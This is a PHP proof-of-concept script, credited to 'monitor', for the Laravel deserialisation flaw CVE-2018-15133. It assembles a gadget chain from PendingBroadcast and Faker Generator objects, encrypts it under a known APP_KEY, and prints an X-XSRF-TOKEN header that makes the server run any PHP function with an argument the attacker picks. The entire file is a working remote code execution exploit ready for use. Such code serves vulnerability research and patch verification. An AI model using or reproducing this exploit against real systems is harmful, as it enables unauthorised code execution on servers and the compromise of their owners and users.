<?php
/*
Author:monitor
description:
    poc for CVE-2018-15133
*/
namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        function __construct($events, $cmd)
        {
            $this->events = $events;
            $this->event = $cmd;
        }
    }
}


namespace Faker
{
    class Generator
    {
        protected $formatters;

        function __construct($function)
        {
            $this->formatters = ['dispatch' => $function];
        }
    }
}



namespace
{     
      // cipher function from @kozmic
      if ($argc<4){
            echo "Usage:".$argv[0]. " <APP_KEY> <function> <parameter>" . PHP_EOL;
            exit();
      }
      $key = $argv[1];
      $function = $argv[2];
      $param = $argv[3];

      $payload = new Illuminate\Broadcasting\PendingBroadcast(
            new Faker\Generator($function),
            $param
        );
        $payload_encode = base64_encode(serialize($payload));


      $cipher = 'AES-256-CBC'; // or 'AES-128-CBC'

      $iv = random_bytes(openssl_cipher_iv_length($cipher)); // instead of rolling a dice ;)

      $value = \openssl_encrypt(
      base64_decode($payload_encode), $cipher, base64_decode($key), 0, $iv
      );

      if ($value === false) {
      exit("Could not encrypt the data.");
      }

      $iv = base64_encode($iv);
      $mac = hash_hmac('sha256', $iv.$value, base64_decode($key));

      $json = json_encode(compact('iv', 'value', 'mac'));

      if (json_last_error() !== JSON_ERROR_NONE) {
      echo "Could not json encode data." . PHP_EOL;
      exit();
      }

      $encodedPayload = base64_encode($json);

      echo "HTTP header for POST request: \nX-XSRF-TOKEN: " . $encodedPayload . PHP_EOL;
}